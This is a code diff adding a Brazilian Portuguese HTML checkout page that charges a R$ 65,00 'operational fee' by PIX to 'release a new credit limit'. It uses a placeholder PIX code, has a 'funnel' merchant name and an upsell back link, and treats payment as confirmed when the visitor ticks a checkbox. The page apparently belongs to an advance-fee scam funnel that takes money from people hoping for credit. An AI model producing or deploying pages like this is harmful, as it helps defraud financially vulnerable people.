@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Aumento de Limite</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f5f7f9;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkout-container {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .header h2 {
+            color: #ffd900;
+            font-weight: bold;
+        }
+        .price-section {
+            background: #ffd900;
+            color: black;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        .price-section h3 {
+            color: black;
+            font-weight: bold;
+            margin: 0;
+        }
+        .price-label {
+            color: #333;
+            font-size: 0.9rem;
+        }
+        .pix-section {
+            border: 2px solid #ffd900;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        .pix-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+        .pix-key {
+            background: #f5f7f9;
+            padding: 1rem;
+            border-radius: 6px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            user-select: all;
+            cursor: pointer;
+        }
+        .copy-btn {
+            background: #ffd900;
+            color: black;
+            border: none;
+            padding: 0.75rem 2rem;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+        .copy-btn:hover {
+            background: #e6c200;
+            color: black;
+        }
+        .confirm-section {
+            margin-top: 2rem;
+            padding-top: 2rem;
+            border-top: 1px solid #e6dddd;
+        }
+        .confirm-btn {
+            background: #28c45c;
+            color: white;
+            border: none;
+            padding: 0.75rem 2rem;
+            border-radius: 6px;
+            font-weight: 500;
+            width: 100%;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        .confirm-btn:hover {
+            background: #1fa34a;
+            color: white;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .back-link a {
+            color: #111;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="checkout-container">
+        <div class="header">
+            <h2>Aumento de Limite</h2>
+            <p>Taxa operacional para liberar novo limite</p>
+        </div>
+
+        <div class="price-section">
+            <p class="price-label">Valor a pagar</p>
+            <h3>R$ 65,00</h3>
+        </div>
+
+        <div class="pix-section">
+            <div class="pix-icon">📱</div>
+            <h4>Pagar com PIX</h4>
+            <p style="color: #666; font-size: 0.9rem; margin: 1rem 0;">Copie o código PIX abaixo</p>
+
+            <div class="pix-key" id="pixKey" onclick="copiarPix()">
+00020126580014br.gov.bcb.pix0136CHAVE-PIX-EXEMPLO-0000000000000000520400005303986540565.005802BR5913FUNIL CMPLT6009SAO PAULO62760503***63041D3D
+            </div>
+
+            <button class="copy-btn" onclick="copiarPix()">
+                <span id="btnText">📋 Copiar código PIX</span>
+            </button>
+
+            <p style="color: #666; font-size: 0.9rem;">
+                Cole o código em seu aplicativo bancário. Você pode fazer a transferência PIX de qualquer banco.
+            </p>
+        </div>
+
+        <div class="confirm-section">
+            <label style="display: flex; align-items: center; margin-bottom: 1rem;">
+                <input type="checkbox" id="confirmCheck" style="width: 1.2rem; height: 1.2rem; margin-right: 0.5rem; cursor: pointer;">
+                <span style="cursor: pointer;">Já realizei o pagamento via PIX</span>
+            </label>
+
+            <button class="confirm-btn" id="confirmBtn" onclick="confirmarPagamento()" disabled style="opacity: 0.5;">
+                Finalizar
+            </button>
+        </div>
+
+        <div class="back-link">
+            <a href="../" onclick="voltarUpsell(); return false;">Voltar</a>
+        </div>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            let url = baseUrl;
+            const paramStr = new URLSearchParams(params).toString();
+            if (paramStr) {
+                url += '?' + paramStr;
+            }
+            return url;
+        }
+
+        function copiarPix() {
+            const pixKey = document.getElementById('pixKey').innerText;
+            navigator.clipboard.writeText(pixKey).then(() => {
+                const btnText = document.getElementById('btnText');
+                const originalText = btnText.innerText;
+                btnText.innerText = '✓ Copiado!';
+                setTimeout(() => {
+                    btnText.innerText = originalText;
+                }, 2000);
+            });
+        }
+
+        document.getElementById('confirmCheck').addEventListener('change', function() {
+            const confirmBtn = document.getElementById('confirmBtn');
+            if (this.checked) {
+                confirmBtn.disabled = false;
+                confirmBtn.style.opacity = '1';
+            } else {
+                confirmBtn.disabled = true;
+                confirmBtn.style.opacity = '0.5';
+            }
+        });
+
+        function confirmarPagamento() {
+            // Redireciona para página de conclusão ou dashboard
+            const nextUrl = buildUrlWithParams('../../../conclusao/');
+            window.location.href = nextUrl;
+        }
+
+        function voltarUpsell() {
+            const backUrl = buildUrlWithParams('../');
+            window.location.href = backUrl;
+        }
+    </script>
+</body>
+</html>
